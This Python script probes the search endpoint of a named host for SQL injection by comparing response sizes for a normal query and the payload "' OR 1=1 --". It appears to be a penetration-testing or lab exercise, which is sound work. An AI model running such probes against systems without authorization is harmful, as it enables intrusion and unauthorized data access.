# ============================================================
#  Search Input SQL Injection
#  Target: search.0x10.cloud
#  Author: Genesis Tugawin
# ============================================================
#
#  SQL Injection is a vulnerability where user input is
#  interpreted as SQL code. An attacker can use payloads
#  like "' OR 1=1 --" to bypass authentication or retrieve
#  unauthorized data from the database.
#
#  This script tests a search endpoint for SQL injection by
#  comparing response body lengths between a normal query and
#  a malicious payload. If SQL injection is successful, the
#  payload would return different (often more) data.
#
#  Technique: Compare body length of q=1 vs q=' OR 1=1 --
#  A significant difference suggests SQL injection vulnerability.
# ============================================================

import urllib.request
import urllib.parse
import time

TARGET = "https://search.0x10.cloud/"
TIMEOUT = 5
DELAY = 0.15


def test_endpoint(query_param, phase_label):
    """
    Test endpoint with given query parameter and return body length.
    Returns tuple of (status_code, body_length) or (0, 0) on failure.
    """
    params = {"q": query_param}
    url = f"{TARGET}?{urllib.parse.urlencode(params)}"

    print(f"\n  {phase_label}")
    print(f"  URL: {url}")

    try:
        time.sleep(DELAY)
        response = urllib.request.urlopen(url, timeout=TIMEOUT)
        status_code = response.getcode()
        body_length = len(response.read().decode('utf-8'))

        print(f"  Status Code: {status_code}")
        print(f"  Body Length: {body_length} bytes")
        return status_code, body_length
    except Exception as e:
        print(f"  [ERROR] {e}")
        return 0, 0


try:
    print("=" * 50)
    print("  SQL Injection Check")
    print("=" * 50)

    # Test with normal query
    status_normal, length_normal = test_endpoint("1", "[PHASE 1] Testing with normal query (q=1)...")

    # Test with SQL injection payload
    status_injection, length_injection = test_endpoint("' OR 1=1 --", "[PHASE 2] Testing with SQL injection payload (q=' OR 1=1 --}...")

    # Compare results and analyze
    print("\n  [ANALYSIS] Comparing body lengths...")
    print(f"  Normal query body length: {length_normal} bytes")
    print(f"  SQL injection payload body length: {length_injection} bytes")

    if length_normal > 0 and length_injection > 0:
        difference = length_injection - length_normal
        percentage_change = (difference / length_normal) * 100

        print(f"  Difference: {difference} bytes ({percentage_change:+.1f}%)")

        # Determine vulnerability level based on response difference
        if abs(difference) > 100 or abs(percentage_change) > 10:
            print("\n  [!] VULNERABILITY LIKELY FOUND")
            print("  The SQL injection payload returned significantly different data.")
            print("  This suggests the server may be vulnerable to SQL injection.")
        elif abs(difference) > 0:
            print("\n  [?] POSSIBLE VULNERABILITY")
            print("  The responses differ in size, but the difference is small.")
            print("  Manual inspection of the responses is recommended.")
        else:
            print("\n  [OK] Responses are identical in size.")
            print("  SQL injection may not be present, or server filters the payload.")
    else:
        print("\n  [ERROR] Could not complete comparison due to request failures.")

    print("\n" + "=" * 50)

except Exception as e:
    print(f"\n  [FATAL ERROR] {e}")
    print("=" * 50)

